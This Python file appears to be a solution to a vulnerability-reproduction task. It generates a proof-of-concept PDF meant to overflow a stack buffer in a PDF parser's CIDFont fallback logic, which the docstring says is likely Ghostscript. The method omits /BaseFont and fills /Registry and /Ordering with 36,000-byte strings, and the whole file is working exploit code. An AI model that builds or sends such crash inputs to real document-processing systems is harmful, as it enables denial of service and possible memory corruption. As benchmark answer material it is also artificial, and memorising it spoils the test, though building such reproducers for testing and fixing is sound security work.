import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability.
        
        The vulnerability exists in the CIDFont fallback mechanism (likely in Ghostscript or similar PDF parsers).
        When a CIDFont lacks a BaseFont, the parser constructs a fallback name by concatenating 
        the Registry and Ordering strings from the CIDSystemInfo dictionary: "<Registry>-<Ordering>".
        This concatenation occurs into a fixed-size stack buffer, leading to an overflow.
        
        To trigger this, we construct a valid PDF file containing a CIDFont (Type 2) with:
        1. No /BaseFont entry (to force the fallback path).
        2. A CIDSystemInfo dictionary with extremely large /Registry and /Ordering strings.
        """
        
        # Parameters for the payload
        # Ground truth is ~80KB. We use two chunks of 36KB to ensure we overflow even large stack buffers (e.g. 64KB).
        # Total payload size ~72KB + PDF overhead fits well.
        chunk_size = 36000
        payload_registry = b"A" * chunk_size
        payload_ordering = b"B" * chunk_size
        
        # PDF Structure Construction
        objects = []
        
        # Helper to add objects in order
        def add_obj(oid, content):
            objects.append((oid, content))

        # 1. Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # 2. Pages
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # 3. Page
        # Links to Font /F1 (Obj 4) and Content (Obj 5)
        add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>")
        
        # 4. Type0 Font
        # The parent font that references the vulnerable CIDFont (Obj 6)
        add_obj(4, b"<< /Type /Font /Subtype /Type0 /BaseFont /PoCFont /Encoding /Identity-H /DescendantFonts [6 0 R] >>")
        
        # 5. Content Stream
        # Use the font to force the parser to load and process it
        stream_data = b"BT /F1 12 Tf (Trigger) Tj ET"
        add_obj(5, b"<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n" + stream_data + b"\nendstream")
        
        # 6. CIDFont (Vulnerable Object)
        # We omit /BaseFont to trigger the fallback logic.
        # We provide the massive Registry and Ordering strings.
        cid_system_info = b"<< /Registry (" + payload_registry + b") /Ordering (" + payload_ordering + b") /Supplement 0 >>"
        add_obj(6, b"<< /Type /Font /Subtype /CIDFontType2 /CIDSystemInfo " + cid_system_info + b" /FontDescriptor 7 0 R >>")
        
        # 7. FontDescriptor
        # Required for valid font definition
        add_obj(7, b"<< /Type /FontDescriptor /FontName /PoCFont /Flags 4 /FontBBox [0 0 1000 1000] >>")
        
        # Serialize the PDF
        pdf_content = bytearray()
        pdf_content.extend(b"%PDF-1.4\n")
        
        offsets = {}
        
        # Write objects
        for oid, content in objects:
            offsets[oid] = len(pdf_content)
            pdf_content.extend(f"{oid} 0 obj\n".encode())
            pdf_content.extend(content)
            pdf_content.extend(b"\nendobj\n")
            
        # Write XREF table
        xref_start = len(pdf_content)
        pdf_content.extend(b"xref\n")
        pdf_content.extend(f"0 {len(objects) + 1}\n".encode())
        pdf_content.extend(b"0000000000 65535 f \n")
        
        for oid in range(1, len(objects) + 1):
            pdf_content.extend(f"{offsets[oid]:010} 00000 n \n".encode())
            
        # Write Trailer
        pdf_content.extend(b"trailer\n")
        pdf_content.extend(f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode())
        pdf_content.extend(b"startxref\n")
        pdf_content.extend(f"{xref_start}\n".encode())
        pdf_content.extend(b"%%EOF")
        
        return bytes(pdf_content)
